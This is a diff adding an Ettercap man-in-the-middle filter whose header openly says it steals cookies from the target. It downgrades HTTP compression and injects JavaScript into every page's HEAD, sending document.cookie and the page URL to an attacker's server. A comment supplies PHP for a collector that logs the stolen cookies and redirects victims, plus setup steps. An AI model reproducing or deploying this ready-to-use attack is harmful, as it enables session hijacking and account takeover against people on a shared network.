@@ -1,0 +1,28 @@
+# Author: Bl4ck5w4n ||
+# Description: This filter steals cookies from the target
+# You will need to have this php code:
+#
+# $cookiefile = "paraponera_cookies.txt";
+# $fh = (file_exists($cookiefile))? fopen($cookiefile, "a+") : fopen($cookiefile, "w+");
+# $content = ' URL: ' . $_GET['u'] .' COOKIE: '. $_GET['c'];
+# fwrite($fh, $content);
+# fclose($fh); 
+# header('Location: http://www.google.com/');
+#
+# Copy and paste the code in /var/www or upload to a webserver  
+# Start Apache and then put in Replace filed the url of file http://address_to/name_of_file.php ||
+# Type: Single ||
+
+
+if (ip.proto == TCP && tcp.dst == 80) {
+	if (search(DATA.data, "Accept-Encoding")) {
+		replace("Accept-Encoding", "Accept-Rubbish!"); 
+		msg("changed Accept-Encoding!\n");
+	}
+}
+
+if (ip.proto == TCP && tcp.src == 80) {
+	replace("</HEAD>", "</HEAD><script type=\"text/javascript\">location.href = 'REPLACE_ME?c='+document.cookie+'&u='+document.URL;</script>\");
+        replace("</head>", "</head><script type=\"text/javascript\">location.href = 'REPLACE_ME?c='+document.cookie+'&u='+document.URL;</script>\");
+	msg("Filter Ran.\n");
+} 
